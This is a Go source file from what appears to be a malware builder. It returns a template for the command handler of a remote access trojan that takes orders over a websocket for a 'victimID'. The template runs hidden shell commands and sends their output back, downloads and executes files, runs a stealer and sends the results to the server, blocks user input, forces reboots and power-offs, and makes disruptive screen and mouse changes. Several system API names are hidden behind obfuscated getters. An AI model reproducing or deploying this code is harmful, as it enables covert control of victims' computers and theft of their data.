package buildergen

import "strings"

func templateCommands() string {
	return strings.TrimSpace(`
func sendCmdOutput(conn *websocket.Conn, victimID, output string) {
	if conn == nil {
		return
	}
	msg := map[string]interface{}{
		"type":      "cmd_output",
		"victim_id": victimID,
		"output":    output,
	}
	_ = wsWriteJSON(conn, msg)
}

var shakeScreenFlag int32

func toggleFlagA(enabled bool) {
	if runtime.GOOS != "windows" {
		return
	}
	user32 := syscall.NewLazyDLL(getUser32DLL())
	proc := user32.NewProc(getBlockInputName())

	var flag uintptr
	if enabled {
		flag = 1
	} else {
		flag = 0
	}
	r, _, _ := proc.Call(flag)
	if r == 0 {
		return
	}
}

func showMsgBox(iconName, buttonsName, header, content string) {
	if runtime.GOOS != "windows" {
		return
	}

	u32 := syscall.NewLazyDLL(getUser32DLL())
	proc := u32.NewProc(getMessageBoxWName())

	icon := 0
	switch strings.ToLower(strings.TrimSpace(iconName)) {
	case "error":
		icon = 0x00000010
	case "warning":
		icon = 0x00000030
	case "question":
		icon = 0x00000020
	case "info":
		icon = 0x00000040
	default:
		icon = 0
	}

	buttons := 0x00000000
	switch strings.ToLower(strings.TrimSpace(buttonsName)) {
	case "ok":
		buttons = 0x00000000
	case "okcancel":
		buttons = 0x00000001
	case "yesno":
		buttons = 0x00000004
	case "yesnocancel":
		buttons = 0x00000003
	case "retrycancel":
		buttons = 0x00000005
	case "abortretryignore":
		buttons = 0x00000002
	}

	text := strings.TrimSpace(content)
	if text == "" {
		text = " "
	}
	caption := strings.TrimSpace(header)
	if caption == "" {
		caption = " "
	}

	txtPtr, _ := syscall.UTF16PtrFromString(text)
	capPtr, _ := syscall.UTF16PtrFromString(caption)

	style := uintptr(buttons | icon | 0x00040000 | 0x00010000)
	_, _, _ = proc.Call(0, uintptr(unsafe.Pointer(txtPtr)), uintptr(unsafe.Pointer(capPtr)), style)
}

func swapMouseButtons(swapLeftRight bool) {
	if runtime.GOOS != "windows" {
		return
	}

	user32 := syscall.NewLazyDLL(getUser32DLL())
	proc := user32.NewProc(getSystemParametersInfoWName())

	const SPI_SETMOUSEBUTTONSWAP = 0x0021

	var swapFlag uintptr
	if swapLeftRight {
		swapFlag = 1
	} else {
		swapFlag = 0
	}

	ret, _, _ := proc.Call(
		uintptr(SPI_SETMOUSEBUTTONSWAP),
		swapFlag,
		0,
		uintptr(0x01|0x02),
	)
	if ret == 0 {
		return
	}
}

func startShakeScreen() {
	if runtime.GOOS != "windows" {
		return
	}
	if !atomic.CompareAndSwapInt32(&shakeScreenFlag, 0, 1) {
		return
	}
	go func() {
		user32 := syscall.NewLazyDLL(getUser32DLL())
		procSetCursorPos := user32.NewProc(getSetCursorPosName())
		for atomic.LoadInt32(&shakeScreenFlag) == 1 {
			x := 500 + rand.Intn(40) - 20
			y := 400 + rand.Intn(40) - 20
			_, _, _ = procSetCursorPos.Call(uintptr(x), uintptr(y))
			time.Sleep(30 * time.Millisecond)
		}
	}()
}

func stopShakeScreen() {
	atomic.StoreInt32(&shakeScreenFlag, 0)
}

func runTaskA(command string) {
	if command == "" {
		return
	}
	downloadAndExec(command)
}

func runTaskB(url string) {
	if url == "" {
		return
	}
	downloadAndShowImage(url)
}

func openURLInBrowser(urlStr string) {
	if runtime.GOOS != "windows" {
		return
	}
	if urlStr == "" {
		return
	}
	_ = cmdHidden(getCmdExeName(), getCmdCArg(), getCmdStart(), urlStr).Start()
}

func runTaskC(command string) {
	cmd := strings.TrimSpace(command)
	if cmd == "" {
		return
	}
	lower := strings.ToLower(cmd)
	if strings.HasPrefix(lower, getHttpPrefix()) || strings.HasPrefix(lower, getHttpsPrefix()) {
		openURLInBrowser(cmd)
		return
	}
	go func() {
		_ = cmdHidden(getCmdExeName(), getCmdCArg(), cmd).Start()
	}()
}

func rotateScreen(angleDeg int) {
	if runtime.GOOS != "windows" {
		return
	}

	user32 := syscall.NewLazyDLL(getUser32DLL())
	enumDisplay := user32.NewProc("EnumDisplaySettingsW")
	changeDisplay := user32.NewProc("ChangeDisplaySettingsExW")

	const dmFieldsPelsWidth = 0x00080000
	const dmFieldsPelsHeight = 0x00100000
	const dmFieldsDisplayOrientation = 0x00000080
	const enumCurrentSettings = 0xFFFFFFFF

	const offDmSize = 68
	const offDmFields = 72
	const offDmDisplayOrientation = 84
	const offDmPelsWidth = 172
	const offDmPelsHeight = 176
	const devmodeSize = 220

	var dm [devmodeSize]byte
	*(*uint16)(unsafe.Pointer(&dm[offDmSize])) = devmodeSize

	r, _, _ := enumDisplay.Call(0, uintptr(enumCurrentSettings), uintptr(unsafe.Pointer(&dm[0])))
	if r == 0 {
		return
	}

	var orient uint32
	switch angleDeg {
	case 90:
		orient = 1
	case 180:
		orient = 2
	case 270:
		orient = 3
	default:
		orient = 0
	}

	curOrient := *(*uint32)(unsafe.Pointer(&dm[offDmDisplayOrientation]))
	pelsW := *(*uint32)(unsafe.Pointer(&dm[offDmPelsWidth]))
	pelsH := *(*uint32)(unsafe.Pointer(&dm[offDmPelsHeight]))

	if (curOrient%2 == 0 && orient%2 != 0) || (curOrient%2 != 0 && orient%2 == 0) {
		pelsW, pelsH = pelsH, pelsW
	}

	*(*uint32)(unsafe.Pointer(&dm[offDmDisplayOrientation])) = orient
	*(*uint32)(unsafe.Pointer(&dm[offDmPelsWidth])) = pelsW
	*(*uint32)(unsafe.Pointer(&dm[offDmPelsHeight])) = pelsH
	*(*uint32)(unsafe.Pointer(&dm[offDmFields])) = dmFieldsPelsWidth | dmFieldsPelsHeight | dmFieldsDisplayOrientation

	changeDisplay.Call(0, uintptr(unsafe.Pointer(&dm[0])), 0, 0, 0)
}

func handleServerCommand(conn *websocket.Conn, victimID, command string) {
	command = strings.TrimSpace(command)
	if command == "" {
		return
	}

	lower := strings.ToLower(command)
	if strings.HasPrefix(lower, strings.ToLower(getMsgBoxPrefix())) {
		parts := strings.SplitN(command, "|", 5)
		icon := "info"
		buttons := "ok"
		header := ""
		content := ""
		if len(parts) >= 2 {
			icon = parts[1]
		}
		if len(parts) >= 3 {
			buttons = parts[2]
		}
		if len(parts) >= 4 {
			header = parts[3]
		}
		if len(parts) >= 5 {
			content = parts[4]
		}
		go showMsgBox(icon, buttons, header, content)
		return
	}

	if lower == strings.ToLower(getSwapMouseLeftCmd()) {
		go swapMouseButtons(true)
		return
	}

	if lower == strings.ToLower(getSwapMouseRightCmd()) {
		go swapMouseButtons(false)
		return
	}

	if lower == "reboot" || lower == "bsod" {
		if runtime.GOOS == "windows" {
			go func() {
				_ = cmdHidden(getShutdownExeName(), getShutdownRestartArg(), getShutdownTimeoutArg(), getShutdownZeroArg()).Start()
			}()
		}
		return
	}

	if lower == "voltage_drop" {
		if runtime.GOOS == "windows" {
			go func() {
				_ = cmdHidden(getShutdownExeName(), getShutdownPoweroffArg(), getShutdownTimeoutArg(), getShutdownZeroArg()).Start()
			}()
		}
		return
	}

	if lower == "rotate_0" {
		go rotateScreen(0)
		return
	}
	if lower == "rotate_90" {
		go rotateScreen(90)
		return
	}
	if lower == "rotate_180" {
		go rotateScreen(180)
		return
	}
	if lower == "rotate_270" {
		go rotateScreen(270)
		return
	}

	if lower == strings.ToLower(getShakeOnCmd()) {
		startShakeScreen()
		return
	}

	if lower == strings.ToLower(getShakeOffCmd()) {
		stopShakeScreen()
		return
	}

	if lower == strings.ToLower(getBlockInputOnCmd()) {
		go toggleFlagA(true)
		return
	}

	if lower == strings.ToLower(getBlockInputOffCmd()) {
		go toggleFlagA(false)
		return
	}

	if strings.HasPrefix(lower, "steal:") {
		go func() {
			result := runStealer()

			if conn != nil {
				msg := map[string]interface{}{
					"type":       "steal_result",
					"data":       result,
					"auto_steal": "",
				}
				if err := wsWriteJSON(conn, msg); err != nil {
				}
			} else {
			}
		}()
		return
	}

	cmdPrefix := strings.ToLower(getCmdPrefix())
	bgPrefix := strings.ToLower(getBgPrefix())
	if strings.HasPrefix(lower, bgPrefix) {
		cmdline := strings.TrimSpace(command[len(bgPrefix):])
		if cmdline == "" {
			return
		}
		go runTaskB(cmdline)
		return
	}

	if strings.HasPrefix(lower, cmdPrefix) {
		cmdline := strings.TrimSpace(command[len(cmdPrefix):])
		if cmdline == "" {
			return
		}
		go func() {
			out, err := cmdHidden(getCmdExeName(), getCmdCArg(), cmdline).CombinedOutput()
			result := string(out)
			if strings.TrimSpace(result) == "" {
				if err != nil {
					result = "Error: " + err.Error()
				} else {
					result = "(no output)"
				}
			} else if err != nil {
				result += "\nError: " + err.Error()
			}
			sendCmdOutput(conn, victimID, result)
		}()
		return
	}

	if strings.HasPrefix(command, getRemotePrefix()) || strings.HasSuffix(strings.ToLower(command), getExeSuffix()) {
		go runTaskA(command)
		return
	}

	go runTaskC(command)
	return
}
`)
}
